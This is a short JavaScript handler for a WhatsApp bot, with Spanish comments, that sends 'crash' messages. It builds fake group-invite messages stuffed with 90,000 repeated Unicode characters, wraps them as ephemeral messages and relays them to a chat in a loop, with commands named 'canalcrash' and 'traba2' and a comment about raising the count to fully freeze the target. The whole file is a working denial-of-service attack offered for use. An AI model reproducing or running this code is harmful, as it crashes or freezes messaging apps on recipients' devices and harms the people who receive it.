let handler = async (m, { conn }) => {
  const inviteCode = 'CHANNEL-XPL0IT-' + '𓂀'.repeat(90000);
  const groupName = '🔥 Canal Oficial ⚠️' + '꧁'.repeat(90000);
  const channelJid = '120363999999999999@g.us'; // Pon el JID de un canal real si quieres
  const thumbnailFake = Buffer.alloc(1); // Al menos 1 byte, para evitar error

  const fakeInviteContent = {
    groupJid: channelJid,
    inviteCode,
    groupName,
    jpegThumbnail: thumbnailFake
  };

  const wrappedMessage = {
    ephemeralMessage: {
      message: {
        groupInviteMessage: fakeInviteContent
      }
    }
  };

  // Envíalo múltiples veces
  for (let i = 0; i < 5; i++) { // Cambia a 200 para full traba
    await conn.relayMessage(
      m.chat,
      wrappedMessage,
      { messageId: generateMessageID() }
    );
  }

  m.reply('✅ *Traba de canal enviada correctamente.*');
};

handler.command = ["lagcanalplus", "canalcrash", "traba2"];
export default handler;

function generateMessageID() {
  return Math.random().toString(36).substring(2, 15);
}